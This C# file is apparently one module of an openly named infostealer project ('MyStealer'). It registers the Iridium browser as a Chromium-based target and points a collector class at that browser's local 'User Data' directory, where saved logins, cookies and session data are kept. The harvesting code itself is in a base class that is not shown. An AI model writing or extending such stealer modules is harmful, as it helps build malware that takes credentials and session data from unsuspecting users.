using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    internal class IridiumBrowser : Chromium
    {
        public override string ModuleName => "Iridium Browser";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Iridium", "User Data");
    }
}
